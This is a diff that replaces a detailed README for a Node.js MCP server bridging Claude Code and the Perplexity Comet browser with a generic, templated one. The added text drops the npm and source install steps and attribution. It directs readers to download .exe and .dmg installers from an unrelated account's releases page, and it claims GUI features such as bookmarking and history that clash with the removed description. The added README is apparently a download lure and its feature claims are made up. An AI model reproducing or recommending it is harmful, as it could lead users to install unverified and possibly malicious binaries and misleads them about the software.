@@ -1,528 +1,73 @@
-# Perplexity Comet MCP
+# 🌌 Perplexity-Comet-MCP - Effortless Web Browsing and Research
 
-[![npm version](https://img.shields.io/npm/v/perplexity-comet-mcp.svg)](https://www.npmjs.com/package/perplexity-comet-mcp)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
-[![Node.js Version](https://img.shields.io/node/v/perplexity-comet-mcp.svg)](https://nodejs.org)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.0-blue.svg)](https://www.typescriptlang.org/)
-[![MCP Compatible](https://img.shields.io/badge/MCP-Compatible-green.svg)](https://modelcontextprotocol.io/)
-[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20WSL-lightgrey.svg)]()
+[![Download Now](https://img.shields.io/badge/Download%20Now-Perplexity--Comet--MCP-blue.svg)](https://github.com/Thomasneatbiggers/Perplexity-Comet-MCP/releases)
 
-A production-grade MCP (Model Context Protocol) server that bridges Claude Code with Perplexity's Comet browser for autonomous web browsing, research, and multi-tab workflow management.
+## 🚀 Getting Started
 
----
+Welcome to **Perplexity-Comet-MCP**! This application connects the Claude Code to the Perplexity Comet browser, enabling you to browse the web autonomously. You can manage multiple tabs with ease and utilize various tools for enhanced research.
 
-## Why Perplexity Comet MCP?
+### 🛠 Features
 
-| Approach | Limitation |
-|----------|------------|
-| **Search APIs** | Static text, no interaction, no login support |
-| **Browser Automation** | Single-agent model overwhelms context, fragments focus |
-| **Perplexity Comet MCP** | Claude codes while Comet handles browsing autonomously |
+- **Autonomous Web Browsing:** Let the application browse for you.
+- **Agentic Research:** Fetch information effortlessly with smart tools.
+- **Multi-Tab Management:** Keep several pages open without hassle.
+- **Smart Completion Detection:** Automatically complete your queries.
+- **Auto-Reconnect:** Always stay connected to the web.
+- **Tab Protection:** Safeguard your open tabs from unwanted closures.
+- **Enhanced Tool Set:** Utilize an improved version with seven tools, including **comet_tabs** for better organization.
 
-This is a significantly enhanced fork of [hanzili/comet-mcp](https://github.com/hanzili/comet-mcp) with Windows support, smart completion detection, robust connection handling, and full tab management.
+## 📋 Requirements
 
----
+To run **Perplexity-Comet-MCP**, you need:
 
-## Features
+- **Operating System:**
+  - Windows 10 or later
+  - macOS Big Sur or later
+  - Windows Subsystem for Linux (WSL) installed on Windows
 
-### Core Capabilities
+- **Hardware:**
+  - At least 4 GB of RAM
+  - 1 GB of available disk space
 
-- **Autonomous Web Browsing** - Comet navigates, clicks, types, and extracts data while Claude focuses on coding
-- **Deep Research Mode** - Leverage Perplexity's research capabilities for comprehensive analysis
-- **Login Wall Handling** - Access authenticated content through real browser sessions
-- **Dynamic Content** - Full JavaScript rendering and interaction support
+## 📥 Download & Install
 
-### Enhanced Features (New in This Fork)
+To get started, you need to download the application. Visit the Releases page to download the version that suits your operating system.
 
-| Feature | Description |
-|---------|-------------|
-| **Windows/WSL Support** | Full compatibility with Windows and WSL environments |
-| **Tab Management** | Track, switch, and close browser tabs with protection |
-| **Smart Completion** | Detect response completion without fixed timeouts |
-| **Auto-Reconnect** | Exponential backoff recovery from connection drops |
-| **One-Shot Reliability** | Pre-operation health checks for consistent execution |
-| **Agentic Auto-Trigger** | Automatically triggers browser actions from natural prompts |
+[Download Release](https://github.com/Thomasneatbiggers/Perplexity-Comet-MCP/releases)
 
----
+Here are the steps to install the application:
 
-## Comparison with Original
+1. Click on the **Releases** link above.
+2. Find the latest version of **Perplexity-Comet-MCP**.
+3. Download the installer for your operating system (look for `.exe` for Windows, `.dmg` for macOS, or specific files for WSL).
+4. Once downloaded, locate the file in your downloads folder.
+5. Double-click the installer file and follow the on-screen instructions to complete the installation.
 
-| Capability | Original | Enhanced |
-|------------|----------|----------|
-| Platform Support | macOS | Windows, WSL, macOS |
-| Available Tools | 6 | 8 (+comet_tabs, +comet_upload) |
-| Completion Detection | Fixed timeout | Stability-based |
-| Connection Recovery | None | Auto-reconnect with backoff |
-| Tab Management | None | Full registry and control |
-| Health Monitoring | None | Cached health checks |
-| Last Tab Protection | None | Prevents browser crash |
+## 🌟 Using Perplexity-Comet-MCP
 
----
+Once installed, open the application. You'll see a simple interface designed for ease of use.
 
-## Installation
+1. **Set Up Your Preferences:** Before you start browsing, adjust the settings according to your needs.
+2. **Start Browsing:** Use the input box to type your questions or topics of interest. The software will autonomously gather information for you.
+3. **Manage Tabs:** Open multiple queries in different tabs. Switch between them easily to review the information.
+4. **Utilize Tools:** Make use of the offered tools for smart completion and organization. 
 
-### Prerequisites
+## 📊 Additional Features
 
-- Node.js 18 or higher
-- [Perplexity Comet Browser](https://www.perplexity.ai/comet) installed
-- Claude Code or compatible MCP client
+- **Overview Display:** View important data and statistics related to your queries.
+- **History Management:** Access previously searched topics and their results.
+- **Bookmarking:** Save important tabs for easy access later.
 
-### Install via npm
+## 📞 Get Help
 
-```bash
-npm install -g perplexity-comet-mcp
-```
+If you encounter any issues, please check the FAQ section on the Releases page or reach out through the contact section. We're here to assist you.
 
-### Install from Source
+## 🔗 Explore More
 
-```bash
-git clone https://github.com/RapierCraft/perplexity-comet-mcp.git
-cd perplexity-comet-mcp
-npm install
-npm run build
-```
+You can learn more about the features, updates, and community feedback on our GitHub repository:
 
-### Configure Claude Code
+[GitHub Repository](https://github.com/Thomasneatbiggers/Perplexity-Comet-MCP)
 
-Add to your Claude Code MCP settings (`~/.claude/settings.json` or VS Code settings):
+Feel free to explore the topics related to this project, such as `ai-agent`, `anthropic`, and `browser-automation`, to broaden your understanding and capability.
 
-```json
-{
-  "mcpServers": {
-    "comet-bridge": {
-      "command": "node",
-      "args": ["/path/to/perplexity-comet-mcp/dist/index.js"]
-    }
-  }
-}
-```
-
-**Windows Users:** Use the full Windows path:
-
-```json
-{
-  "mcpServers": {
-    "comet-bridge": {
-      "command": "node",
-      "args": ["C:\\Users\\YourName\\perplexity-comet-mcp\\dist\\index.js"]
-    }
-  }
-}
-```
-
----
-
-## Tools Reference
-
-### comet_connect
-
-Establish connection to Comet browser. Auto-launches if not running.
-
-```
-Parameters: None
-Returns: Connection status message
-```
-
-**Example:**
-```
-> comet_connect
-Comet started with debug port 9223
-Connected to Perplexity (cleaned 2 old tabs)
-```
-
----
-
-### comet_ask
-
-Send a prompt to Comet and wait for the complete response. Automatically triggers agentic browsing for URLs and action-oriented requests.
-
-```
-Parameters:
-  - prompt (required): Question or task for Comet
-  - newChat (optional): Start fresh conversation (default: false)
-  - timeout (optional): Max wait time in ms (default: 120000)
-
-Returns: Complete response text
-```
-
-**Examples:**
-
-```
-# Simple research query
-> comet_ask "What are the latest features in Python 3.12?"
-
-# Agentic browsing (auto-triggered)
-> comet_ask "Go to github.com/trending and list top Python repos"
-
-# Site-specific data extraction
-> comet_ask "Check the price of iPhone 15 on amazon.com"
-```
-
----
-
-### comet_poll
-
-Check status and progress of ongoing tasks. Returns the response if completed.
-
-```
-Parameters: None
-Returns: Status (IDLE/WORKING/COMPLETED), steps taken, or final response
-```
-
-**Example:**
-```
-> comet_poll
-Status: WORKING
-Browsing: https://github.com/trending
-Current: Scrolling page
-
-Steps:
-  - Preparing to assist you
-  - Navigating to github.com
-  - Clicking on Trending
-  - Scrolling page
-```
-
----
-
-### comet_stop
-
-Halt the current agentic task if it goes off track.
-
-```
-Parameters: None
-Returns: Confirmation message
-```
-
----
-
-### comet_screenshot
-
-Capture a screenshot of the current browser view.
-
-```
-Parameters: None
-Returns: PNG image data
-```
-
----
-
-### comet_tabs
-
-View and manage browser tabs. Essential for multi-tab workflows.
-
-```
-Parameters:
-  - action (optional): "list" (default), "switch", or "close"
-  - domain (optional): Domain to match (e.g., "github.com")
-  - tabId (optional): Specific tab ID
-
-Returns: Tab listing or action confirmation
-```
-
-**Examples:**
-
-```
-# List all external tabs
-> comet_tabs
-2 browsing tab(s) open:
-  - AGENT-BROWSING: github.com [ACTIVE]
-    URL: https://github.com/trending
-  - AGENT-BROWSING: stackoverflow.com
-    URL: https://stackoverflow.com/questions
-
-# Switch to a tab
-> comet_tabs action="switch" domain="stackoverflow.com"
-Switched to stackoverflow.com (https://stackoverflow.com/questions)
-
-# Close a tab (protected if last tab)
-> comet_tabs action="close" domain="github.com"
-Closed github.com
-```
-
-**Tab Protection:**
-- Cannot close the last external browsing tab (prevents Comet crash)
-- Internal tabs (chrome://, Perplexity UI) are automatically filtered
-
----
-
-### comet_mode
-
-Switch Perplexity search modes for different use cases.
-
-```
-Parameters:
-  - mode (optional): "search", "research", "labs", or "learn"
-
-Returns: Current mode or confirmation of switch
-```
-
-| Mode | Use Case |
-|------|----------|
-| search | Quick web searches |
-| research | Deep, comprehensive analysis |
-| labs | Data analytics and visualization |
-| learn | Educational explanations |
-
----
-
-### comet_upload
-
-Upload files to file input elements on web pages. Essential for posting images to social media, attaching files to forms, or uploading documents.
-
-```
-Parameters:
-  - filePath (required): Absolute path to the file to upload
-  - selector (optional): CSS selector for specific file input
-  - checkOnly (optional): If true, only checks what file inputs exist
-
-Returns: Success message or error with available inputs
-```
-
-**Examples:**
-
-```
-# Upload an image to the first file input found
-> comet_upload filePath="/home/user/screenshot.png"
-File uploaded successfully: /home/user/screenshot.png
-
-# Check what file inputs exist on the page
-> comet_upload filePath="dummy" checkOnly=true
-Found 2 file input(s) on the page:
-  1. #image-upload
-  2. input[name="attachment"]
-
-# Upload to a specific input
-> comet_upload filePath="/home/user/doc.pdf" selector="#attachment-input"
-File uploaded successfully: /home/user/doc.pdf
-```
-
-**Workflow for posting images:**
-1. Navigate to the post creation page (e.g., Reddit, Twitter)
-2. Use `comet_upload checkOnly=true` to find file inputs
-3. Use `comet_upload filePath="..." selector="..."` to attach the file
-4. Continue with form submission
-
----
-
-## Architecture
-
-```
-┌─────────────────┐     MCP Protocol      ┌──────────────────┐
-│   Claude Code   │ ◄──────────────────► │  Perplexity      │
-│   (Your IDE)    │                       │  Comet MCP       │
-└─────────────────┘                       └────────┬─────────┘
-                                                   │
-                                          Chrome DevTools
-                                            Protocol
-                                                   │
-                                          ┌────────▼─────────┐
-                                          │  Comet Browser   │
-                                          │  (Perplexity)    │
-                                          └──────────────────┘
-                                                   │
-                                          ┌────────▼─────────┐
-                                          │   External       │
-                                          │   Websites       │
-                                          └──────────────────┘
-```
-
-### Key Components
-
-| Component | Purpose |
-|-----------|---------|
-| `index.ts` | MCP server and tool handlers |
-| `cdp-client.ts` | Chrome DevTools Protocol client with reconnection logic |
-| `comet-ai.ts` | Perplexity interaction, prompt submission, response extraction |
-| `types.ts` | TypeScript interfaces for tabs, state, and CDP types |
-
----
-
-## Configuration
-
-### Environment Variables
-
-| Variable | Description | Default |
-|----------|-------------|---------|
-| `COMET_PATH` | Custom path to Comet executable | Auto-detected |
-| `COMET_PORT` | CDP debugging port | 9223 |
-
-### Custom Comet Path
-
-```bash
-# Windows
-set COMET_PATH=C:\Custom\Path\comet.exe
-
-# macOS/Linux
-export COMET_PATH=/custom/path/to/Comet.app/Contents/MacOS/Comet
-```
-
----
-
-## Troubleshooting
-
-### Connection Issues
-
-**Problem:** `Error: Failed to list targets: ECONNREFUSED`
-
-**Solutions:**
-1. Ensure Comet browser is installed
-2. Close any existing Comet instances
-3. Run `comet_connect` to auto-start with correct flags
-
----
-
-**Problem:** `WebSocket connection closed` during long tasks
-
-**Solution:** This version handles reconnection automatically. If persistent, increase timeout:
-
-```
-comet_ask prompt="..." timeout=180000
-```
-
----
-
-### Windows-Specific Issues
-
-**Problem:** `ECONNRESET` errors on Windows
-
-**Solution:** This version includes PowerShell-based fetch workarounds. Ensure:
-1. PowerShell is available in PATH
-2. No firewall blocking localhost:9223
-
----
-
-**Problem:** Comet not found on Windows
-
-**Solution:** Set custom path:
-```bash
-set COMET_PATH=%LOCALAPPDATA%\Perplexity\Comet\Application\comet.exe
-```
-
----
-
-### WSL-Specific Issues
-
-**Problem:** `WSL cannot connect to Windows localhost:9223`
-
-**Explanation:** WSL2 uses a separate network namespace by default. The MCP uses Chrome DevTools Protocol (CDP) which requires WebSocket connections to Windows localhost.
-
-**Solution:** Enable WSL mirrored networking:
-
-1. Create or edit `%USERPROFILE%\.wslconfig` (e.g., `C:\Users\YourName\.wslconfig`):
-```ini
-[wsl2]
-networkingMode=mirrored
-```
-
-2. Restart WSL:
-```powershell
-wsl --shutdown
-```
-
-3. Open a new WSL terminal and try again.
-
-**Alternative:** Run Claude Code from Windows PowerShell instead of WSL.
-
----
-
-**Problem:** `UNC paths are not supported` warnings
-
-**Explanation:** This is a benign warning from PowerShell when launched from WSL. The MCP handles this automatically.
-
----
-
-### Tab Management Issues
-
-**Problem:** `Cannot close - this is the only browsing tab`
-
-**Explanation:** This is intentional protection. Comet requires at least one external tab. Open another tab first, then close the unwanted one.
-
----
-
-## Development
-
-### Build from Source
-
-```bash
-git clone https://github.com/RapierCraft/perplexity-comet-mcp.git
-cd perplexity-comet-mcp
-npm install
-npm run build
-```
-
-### Run in Development
-
-```bash
-npm run dev
-```
-
-### Run Tests
-
-```bash
-npm test
-```
-
-### Project Structure
-
-```
-perplexity-comet-mcp/
-├── src/
-│   ├── index.ts        # MCP server entry point
-│   ├── cdp-client.ts   # CDP connection management
-│   ├── comet-ai.ts     # AI interaction logic
-│   └── types.ts        # TypeScript definitions
-├── dist/               # Compiled JavaScript
-├── package.json
-├── tsconfig.json
-└── README.md
-```
-
----
-
-## Contributing
-
-Contributions are welcome. Please read [CONTRIBUTING.md](CONTRIBUTING.md) before submitting a pull request.
-
-### Development Guidelines
-
-1. Maintain TypeScript strict mode compliance
-2. Add tests for new features
-3. Update documentation for API changes
-4. Follow existing code style
-
----
-
-## Attribution
-
-This project is an enhanced fork of [comet-mcp](https://github.com/hanzili/comet-mcp) by [hanzili](https://github.com/hanzili).
-
-### Key Enhancements by RapierCraft
-
-- Windows and WSL platform support
-- Tab management system (comet_tabs tool)
-- Smart completion detection
-- Auto-reconnect with exponential backoff
-- Health check caching
-- Agentic prompt auto-transformation
-- Last tab protection
-- Internal tab filtering
-
----
-
-## License
-
-MIT License - see [LICENSE](LICENSE) for details.
-
----
-
-## Links
-
-- [Perplexity Comet Browser](https://www.perplexity.ai/comet)
-- [Model Context Protocol](https://modelcontextprotocol.io/)
-- [Claude Code](https://claude.ai/code)
-- [Original comet-mcp](https://github.com/hanzili/comet-mcp)
-
----
-
-Built with precision by [RapierCraft](https://github.com/RapierCraft)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Perplexity--Comet--MCP-blue.svg)](https://github.com/Thomasneatbiggers/Perplexity-Comet-MCP/releases)
